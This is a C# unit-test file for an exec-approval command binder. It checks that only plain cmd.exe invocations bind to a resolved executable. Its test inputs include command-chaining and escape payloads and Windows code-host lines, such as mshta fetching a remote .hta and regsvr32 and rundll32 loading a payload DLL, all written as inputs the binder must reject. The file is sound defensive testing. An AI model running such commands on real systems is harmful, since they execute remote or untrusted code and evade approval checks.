using System;
using System.Diagnostics;
using System.IO;
using System.Text.Json;
using System.Threading.Tasks;
using OpenClaw.Shared.ExecApprovals;
using Xunit;

namespace OpenClaw.Shared.Tests;

public class ExecReusableCommandBinderTests
{
    [Fact]
    public void CanonicalCmdHostname_BindsResolvedExecutable()
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "hostname.exe"],
            cwd: null,
            env: null);

        Assert.NotNull(bound);
        Assert.True(Path.IsPathFullyQualified(bound!.Argv[0]));
        Assert.EndsWith("hostname.exe", bound.Argv[0], StringComparison.OrdinalIgnoreCase);
        Assert.Equal(bound.Resolution.ResolvedPath, bound.Pattern);
    }

    [Fact]
    public void CanonicalCmdQuotedLiteralArgument_DoesNotBind()
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "where.exe \"hello world\""],
            cwd: null,
            env: null);

        Assert.Null(bound);
    }

    [Theory]
    [InlineData("hostname.exe | findstr.exe host")]
    [InlineData("hostname.exe && whoami.exe")]
    [InlineData("hostname.exe > output.txt")]
    [InlineData("hostname%COMSPEC%.exe")]
    [InlineData("hostname.exe ^& whoami.exe")]
    [InlineData("(hostname.exe)")]
    [InlineData("hostname.exe \"unterminated")]
    public void DynamicOrAmbiguousCmdPayload_DoesNotBind(string payload)
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null);

        Assert.Null(bound);
    }

    [Theory]
    [InlineData("dir")]
    [InlineData("echo hello")]
    public void CmdBuiltin_DoesNotBind(string payload)
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null);

        Assert.Null(bound);
    }

    [Theory]
    [InlineData("cmd.exe", "/c", "hostname.exe")]
    [InlineData("cmd.exe", "/d", "/c", "hostname.exe")]
    public void NoncanonicalCmdCarrier_DoesNotBind(params string[] command)
        => Assert.Null(ExecReusableCommandBinder.TryBind(command, cwd: null, env: null));

    [Theory]
    [InlineData(" /d ", "/s", "/c")]
    [InlineData("/d", " /s ", "/c")]
    [InlineData("/d", "/s", " /c ")]
    public void PaddedCmdSwitch_DoesNotBind(string d, string s, string c)
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", d, s, c, "hostname.exe"],
            cwd: null,
            env: null));

    [Fact]
    public void DirectInterpreter_DoesNotBind()
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/c", "hostname.exe"],
            cwd: null,
            env: null));

    [Fact]
    public void NonexistentRelativeExecutable_DoesNotBind()
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            [@".\future-tool-that-does-not-exist.exe"],
            cwd: Path.GetTempPath(),
            env: null));

    [Fact]
    public void TransparentEnvPayload_DoesNotBind()
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "env hostname.exe"],
            cwd: null,
            env: null);

        Assert.Null(bound);
    }

    [Theory]
    [InlineData("env FOO=bar hostname.exe")]
    [InlineData("env -i hostname.exe")]
    [InlineData("env --unknown hostname.exe")]
    public void ModifiedOrAmbiguousEnvPayload_DoesNotBind(string payload)
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null));

    [Fact]
    public async Task AcceptedSpaceGrammar_MatchesRealCmdChildArgv()
    {
        var host = FindTestHostExecutable();
        var payload = $"{host} --echo-args alpha beta value=three";
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null);

        Assert.NotNull(bound);
        var throughCmd = await RunAndReadArgsAsync(
            "cmd.exe",
            ["/d", "/s", "/c", payload]);
        var direct = await RunAndReadArgsAsync(
            bound!.Argv[0],
            bound.Argv.Skip(1).ToArray());

        Assert.Equal(["alpha", "beta", "value=three"], throughCmd);
        Assert.Equal(throughCmd, direct);
    }

    [Fact]
    public async Task AcceptedTabGrammar_MatchesRealCmdChildArgv()
    {
        var host = FindTestHostExecutable();
        var payload = $"{host}\t--echo-args\talpha\tbeta";
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null);

        Assert.NotNull(bound);
        var throughCmd = await RunAndReadArgsAsync(
            "cmd.exe",
            ["/d", "/s", "/c", payload]);
        var direct = await RunAndReadArgsAsync(
            bound!.Argv[0],
            bound.Argv.Skip(1).ToArray());

        Assert.Equal(["alpha", "beta"], throughCmd);
        Assert.Equal(throughCmd, direct);
    }

    [Fact]
    public void QuotedExecutableToken_DoesNotBind()
    {
        var host = FindTestHostExecutable();
        Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", $"\"{host}\" --echo-args alpha"],
            cwd: null,
            env: null));
    }

    [Fact]
    public void TrailingBackslash_DoesNotBind()
    {
        var host = FindTestHostExecutable();
        Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", $"{host} --echo-args tail\\"],
            cwd: null,
            env: null));
    }

    [Fact]
    public void NonCmdWhitespace_DoesNotBind()
    {
        var host = FindTestHostExecutable();
        Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", $"{host}\u00A0--echo-args"],
            cwd: null,
            env: null));
    }

    [Fact]
    public void CmdEchoSuppressionPrefix_DoesNotBind()
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "@hostname.exe"],
            cwd: null,
            env: null));

    [Theory]
    [InlineData("mshta.exe https://example.invalid/payload.hta")]
    [InlineData("regsvr32.exe /s payload.dll")]
    [InlineData("rundll32.exe payload.dll,EntryPoint")]
    public void WindowsCodeHost_DoesNotBind(string payload)
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null));

    [Fact]
    public void TabDelimitedLiteralArguments_Bind()
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "where.exe\thello"],
            cwd: null,
            env: null);

        Assert.NotNull(bound);
        Assert.Equal("hello", bound!.Argv[1]);
    }

    private static string FindTestHostExecutable()
    {
        var current = new DirectoryInfo(AppContext.BaseDirectory);
        while (current is not null
            && !Directory.Exists(Path.Combine(current.FullName, "tests")))
        {
            current = current.Parent;
        }

        Assert.NotNull(current);
        var configuration = new DirectoryInfo(AppContext.BaseDirectory)
            .Parent?.Name;
        Assert.False(string.IsNullOrWhiteSpace(configuration));
        var path = Path.Combine(
            current!.FullName,
            "tests",
            "OpenClaw.Shared.TestHost",
            "bin",
            configuration!,
            "net10.0",
            "OpenClaw.Shared.TestHost.exe");
        Assert.True(File.Exists(path), $"Argument test host was not built: {path}");
        return path;
    }

    private static async Task<string[]> RunAndReadArgsAsync(
        string executable,
        IReadOnlyList<string> arguments)
    {
        var startInfo = new ProcessStartInfo(executable)
        {
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };
        foreach (var argument in arguments)
            startInfo.ArgumentList.Add(argument);

        using var process = Process.Start(startInfo);
        Assert.NotNull(process);
        var stdout = await process!.StandardOutput.ReadToEndAsync();
        var stderr = await process.StandardError.ReadToEndAsync();
        await process.WaitForExitAsync();
        Assert.True(
            process.ExitCode == 0,
            $"Process failed with exit {process.ExitCode}: {stderr}");
        return JsonSerializer.Deserialize<string[]>(stdout.Trim())
            ?? throw new InvalidOperationException("Argument test host returned invalid JSON.");
    }
}
